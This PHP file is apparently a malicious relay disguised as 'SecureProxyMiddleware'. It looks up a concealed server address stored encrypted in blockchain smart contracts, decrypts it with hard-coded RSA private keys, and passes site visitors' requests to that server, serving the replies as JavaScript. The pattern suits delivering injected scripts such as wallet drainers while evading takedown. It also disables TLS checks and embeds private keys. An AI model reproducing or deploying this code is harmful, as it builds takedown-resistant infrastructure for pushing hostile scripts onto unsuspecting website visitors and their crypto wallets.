<?php
// === CORS + DEBUG ===
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Max-Age: 86400');

function getClientIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) return $_SERVER["HTTP_CF_CONNECTING_IP"];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

class SecureProxyMiddleware {
    private $updateInterval = 10; // Force refresh every 10 sec
    private $rpcUrls;
    private $contractAddressEvm;
    private $contractAddressSol;
    private $cacheFile;
    private $keyEvm;
    private $keySol;
    public $EVM_TYPE = "EVM";
    public $SOL_TYPE = "SOL";

    public function __construct($options = []) {
        $this->keyEvm = $options['keyEvm'] ?? "-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDMiBSiUHvnBcuz
pSMmAkdBwscPBWd4DWQTJVSOXV3yE5g/kygMc8Nn/7ae3xJT3+T9RfzYmE5hRtkp
vhWmxpSUySh2MWE915oul0tywewDVP2BndC+MRKvkuDrntvQdYO5pxhWVSURUWOn
IS9cHlMo6Y+7aYxza8YgYbvPZ+6mWZSv20zApc+o797IedEOFB/JY1N4lyxABbSv
exeZa9zAHFrs8QkOMGilwPXUMDDiSR0oaBViPFLrtkIoxZoCdTYY1EE26pd1pUL0
2eOf/sJwpHwGVPoWlfowahLK8WM18068S4SPCA2hvXhV+tq7VsJWUYIMI7D0a1ln
MDakKYsJAgMBAAECggEAA4m7FE+2Gk9JsHLZLSLO9BPteOoMBHye0DdOGM8D/Vha
GDIbIulXEP57EeZ5R7AmIud0sekjOfWNc3Zmo3rok7ujEor/dqAQemEtnJo+0z6Y
yrGIgdxmyVi4wU//LMJLpAjVl/C4cm3o/mQe5fC0WY8ovazcEXG6J1Hpe3NTIoIp
kooKXwvCRxW+7kO81mqI2037WJ0HagkFxVSrsJcspr6Rlcj1ocPXbUp0eUNOwcbz
q2t+SmlFOyOlapenAUzSzYKQggbN8n9YSGXyKOqjKgdkpsJeneL5txECBkWY0ocg
R06rduYfxszs1LTvFkska98XWdKFZzrS8S7BVhcEDQKBgQD7IMygI39SlUR5MLak
HmyGlLw+VCMTa9eXRy8D9UKDwIs/ODERNUeGgVteTSuzZDJ91o/BRwWUagA2sel4
KReQsw//sOzpc+t/Uw6OpLajfdeVj8eG3h+hTyy+jla8+cpq2EfIzGRRCVFLew85
Ncnv9Ygs9Ug/rji4XTuXgXI/UwKBgQDQf91Q6b9xhSyiotO2WRoZznhEWqPQLUdf
8X5akFID4k/F5DLjvJNoBWlVWg3lDDE+Nc6byWrDO0jGYtJwEUGfJmFE7X6gY70z
eAq8SSijk+g4jOdQsClbzlVlQqLVLTE2vhbUK6lhTrkvuS0qA4Dq/SlBAt0fbz61
gukjbGcsswKBgE2gK+BsWJUMcugLOMmuZdmL7ExP8a+1LCUk6dGNZIwZXnGiSviI
wZ1AKyARNqrzE/B1/GXAMGdaBMrjX8m22gPudcmRxQm8vVTUNbG+FH6hDZy7nu9/
hcN1F92nXgR4Kiuwwy+8jl3GRYzRczk5+TvlZ7yN7VFR51KF7z+70bblAoGANJNp
rZOj8O5SGRjSJjNFv6gu752jnUUtsGXnJNMru0sALriilIbi7OIgc6NnyZBPgo5y
8RnTUDPM4CnfQt83GvjEomr4+VztQuNMYbpZAxazAj+VvOUPKNVY91XcVcE1ncZF
X287IQyG6h/Z4bRMd/Uqx/f+5oRY3dCLFaGqSr0CgYEAmJgjVpmzr0lg1Xjkh+Sf
IFGtOUzeAHvrwdkwJ0JyrhAE2jn5us8fxZBpwy20gB2pNfmH6j4RFZAoQFErJ1lJ
6RFXbNP8KDqe5vIwxOCpfWPNsAFF89RUTBsxJSf1ahFMcz9LJOKuTawliGbxw7Sy
N4gAP7/6l6WMuLCGxr5dcBw=
-----END PRIVATE KEY-----";

        $this->keySol = $options['keySol'] ?? "-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDEVgXbM3+EcrPi
lElO1rEHb8VNg2BYHHfOBtbIuoUxMHS/8xHSpwbmRokE5kJ8IbYI6y06SNl0MFBF
SZUqRqJE5LRWtwFa9gHrB6NuKUkrKcAVa+u+PzjmdzyE7uumQeRHl+35i9SVfKjj
CPZspjqfHVH6Mt9wYjfQBaQlWOxJoGEUaoaKc9wpSmnrdR1QRYl952IAAvQLJe8K
VBG0eNuQk1gc2XcjLmv70kGm8lZZs3n6xhzWKkMf5JBOOPxvaEqk0DFl8WXDeuP1
icWBfqAP9zako4fLX4Ogl8YZwLjE0Y/QkJk4o298+vViwVP/DRLblEy7XkeiAZoa
G9opoyLzAgMBAAECggEAMbhJJmAtwEhd5pi/0c/LqAL1l7IX8WhQLKQNu2qEtVa8
kimHj22N8T3WkB+RoabV1v9bhkGRk/tyMIG4XSrjCAhU5QrWNIdNKAxYplqdNWmO
w73/Rr/y9GYotM9ebM2N9lVyxfnTvYGCsXABG7Wi7c16h55feDHfSXZMQcr5l5Er
/HT++0DLXbQLddzPqQIoipginjW4GD26cgpfqKPmlf+336cF8N7ZxoITs/CsTG0r
pX9+k7zuJPOyBvae2fPWiwjGzrq1dvYV5VJWG27i6S1zWlMc0aXnaB+VJXDZDwzV
5k5mJb88JGWydMnlOfsg/aYVKHNOCHzmozwja4W5gQKBgQD8Uir51amWaScIJ02M
2G5Ub1F5GRfUg9PgrX+vJEhytwe82heZvwvatWFGjGa0U6wCqg3QdJJI+8FLFpWz
bGW1gDKeos4rVlv68YOkSm/oQtQNYbhkes/fxnfKFtBKv9C57Qzmdw8RPurg/dsn
21WLtRsKcBgxdxXab2E4zqlJgQKBgQDHMuGkv/YT0+gZ8QGOkto+xVJ2AQkO6qMA
2KIK6yQui4lnFoE1sV70MJQpcpnCKucoTGgOghoC26qKKhO4bsQK0GvYgYr1PC04
E+KJrSKwHmPuFktw+6K6QaBep1Kl59oM3mV/OB1EJDKaWixg+Mqh1MY7fbq1BFIt
EuuUNfoecwKBgBHIjMTc/T3fnWOiuYGCw4vp6JkbXqWYwPcl40jpyr1jDwWNbXpl
j6VTgU6imJ5/AzGQ4LZfcOv56m6rYdOqgSSgq3Co0tUVGhh+qyOKJ4b8JsvmpkNW
sI36A/lXUEjkagagoXcgzwwNHirLWYXenJHjKsu6iMn7tauWjAif8CiBAoGARpCP
vn0B/yQiJI5rrsX26iWcgJD9VHtqIvKa9KM3vgVQN2SRgSPEL1zGH6ipL09jc7Md
aYZNEJYgY7FkKwGSEQKkMZ4yS411t1fT+FGM6Dbbz4u2Td/WVYTJ+r3rWTo41DY0
XkzSkUEBbAxljDSWE538Wza+3UEamz0IlwhIAmECgYEArF5sPWj9a8v3nv9maPb2
k8zxMqzcxVCD4P2m2Ropz5sWcnHsjNfF6nKbo5fMF4EbOT+t2CZVPIJ2zVqPwypr
IBocMDtQVR3B0CeQrCgpXbdMNXmr3b16P6MiES04WBkBDYHhLSjKAacSCci4ZyEQ
Qw/APED5z7w9USJQA4tmFDA=
-----END PRIVATE KEY-----";

        $this->rpcUrls = $options['rpcUrls'] ?? [
            "https://mainnet.base.org",
            "https://base-rpc.publicnode.com",
            "https://base-mainnet.public.blastapi.io",
            "https://1rpc.io/base"
        ];

        $this->contractAddressEvm = "0x244C9881eA58DdaC4092e79e1723A0d090C9fB32";
        $this->contractAddressSol = "0x0A05F58CA8b31e9E007c840Bb8a00a63543eCEBC";

        $this->cacheFile = sys_get_temp_dir() . '/proxy_cache_secure.json';
    }

    private function loadCache($type) {
        if (!file_exists($this->cacheFile)) return null;
        $cache = json_decode(file_get_contents($this->cacheFile), true);
        if (!$cache || (time() - $cache['timestamp']) > $this->updateInterval) return null;
        return $cache['domain'.$type] ?? null;
    }

    private function saveCache($domain, $type) {
        $cache = ['domain'.$type => $domain, 'timestamp' => time()];
        file_put_contents($this->cacheFile, json_encode($cache));
    }

    private function hexTobase64($hex) {
        $hex = preg_replace('/^0x/', '', $hex);
        $hex = substr($hex, 64);
        $lengthHex = substr($hex, 0, 64);
        $length = hexdec($lengthHex);
        $dataHex = substr($hex, 64, $length * 2);
        return base64_encode(pack('H*', $dataHex));
    }

    private function fetchTargetDomain($addr, $key) {
        $data = 'c2fb26a6';
        foreach ($this->rpcUrls as $rpcUrl) {
            try {
                $ch = curl_init($rpcUrl);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode([
                        'jsonrpc' => '2.0', 'id' => 1,
                        'method' => 'eth_call',
                        'params' => [['to' => $addr, 'data' => '0x' . $data], 'latest']
                    ]),
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_SSL_VERIFYPEER => false
                ]);
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);

                if ($httpCode !== 200) continue;

                $responseData = json_decode($response, true);
                if (isset($responseData['error'])) continue;

                $encrypted = $this->hexTobase64($responseData['result']);
                $domain = $this->decryptSimple($encrypted, $key);
                if ($domain && filter_var($domain, FILTER_VALIDATE_URL)) {
                    return rtrim($domain, '/');
                }
            } catch (Exception $e) {
                continue;
            }
        }
        throw new Exception("Failed to fetch valid domain from any RPC");
    }

    public function getTargetDomain($type) {
        $cached = $this->loadCache($type);
        if ($cached && filter_var($cached, FILTER_VALIDATE_URL) && strpos($cached, 'afumyacviz') === false) {
            return $cached;
        }

        $addr = $key = null;
        switch ($type) {
            case $this->EVM_TYPE: $addr = $this->contractAddressEvm; $key = $this->keyEvm; break;
            case $this->SOL_TYPE: $addr = $this->contractAddressSol; $key = $this->keySol; break;
        }

        $domain = $this->fetchTargetDomain($addr, $key);

        // BLOCK FAKE DOMAINS
        if (strpos($domain, 'afumyacviz') !== false || !preg_match('/\.(com|app|io)$/i', parse_url($domain, PHP_URL_HOST))) {
            throw new Exception("BLOCKED FAKE DOMAIN: $domain");
        }

        $this->saveCache($domain, $type);
        return $domain;
    }

    public function handle($endpoint, $type) {
        try {
            $target = $this->getTargetDomain($type);
            $url = $target . '/' . ltrim($endpoint, '/');

            $headers = getallheaders();
            unset($headers['Host'], $headers['host'], $headers['origin'], $headers['Origin']);
            $headers['x-forwarded-for'] = getClientIP();

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
                CURLOPT_POSTFIELDS => file_get_contents('php://input'),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => array_map(fn($k, $v) => "$k: $v", array_keys($headers), $headers),
                CURLOPT_TIMEOUT => 15,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HEADER => true
            ]);

            $response = curl_exec($ch);
            if (curl_errno($ch)) throw new Exception(curl_error($ch));

            $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            $body = substr($response, $headerSize);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            // FORCE JS
            if (str_ends_with($endpoint, '.js')) {
                header('Content-Type: application/javascript; charset=utf-8');
            } else {
                header('Content-Type: text/plain');
            }

            http_response_code($code);
            echo $body;

        } catch (Exception $e) {
            http_response_code(502);
            echo "PROXY ERROR: " . $e->getMessage();
            error_log("PROXY FAIL: " . $e->getMessage());
        }
    }

    private static function decryptSimple($data, $key) {
        $decrypted = '';
        if (!openssl_private_decrypt(base64_decode($data), $decrypted, $key)) {
            throw new Exception("Decrypt failed");
        }
        return trim($decrypted);
    }
}

// === CLEAR CACHE ON ?clear=1 ===
if (isset($_GET['clear'])) {
    @unlink(sys_get_temp_dir() . '/proxy_cache_secure.json');
    echo "Cache cleared. Refresh page.";
    exit;
}

// === INIT ===
$proxy = new SecureProxyMiddleware();

// === DEBUG DOMAIN ===
if (isset($_GET['debug'])) {
    header('Content-Type: text/plain');
    echo "EVM: " . $proxy->getTargetDomain($proxy->EVM_TYPE) . "\n";
    echo "SOL: " . $proxy->getTargetDomain($proxy->SOL_TYPE) . "\n";
    exit;
}

// === OPTIONS ===
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// === PING ===
if (isset($_GET['e']) && $_GET['e'] === 'ping_proxy') {
    echo 'pong';
    exit;
}

// === ROUTE ===
if (isset($_GET['s'])) {
    $proxy->handle(urldecode($_GET['s']), $proxy->SOL_TYPE);
} elseif (isset($_GET['e'])) {
    $proxy->handle(urldecode($_GET['e']), $proxy->EVM_TYPE);
} else {
    http_response_code(400);
    echo 'Missing endpoint';
}
